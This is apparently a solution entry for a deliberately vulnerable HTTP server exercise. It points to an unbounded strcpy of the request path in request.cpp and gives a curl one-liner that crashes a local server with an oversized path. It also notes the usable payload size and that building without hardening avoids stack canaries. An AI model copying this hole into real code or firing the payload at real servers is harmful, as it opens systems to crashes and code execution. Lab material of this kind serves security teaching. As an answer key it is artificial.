# Solution — 12 · Stack Buffer Overflow (Request Path)

**Code**: `http/request.cpp` → `strcpy(out.clean_path, path_with_query);`

```bash
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

The server crashes on return from the parser frame. Because `recv()`
caps at 1024 bytes, your payload has ~1000 usable bytes. Build with
`ENABLE_HARDENING=OFF` (the default) to avoid canaries.
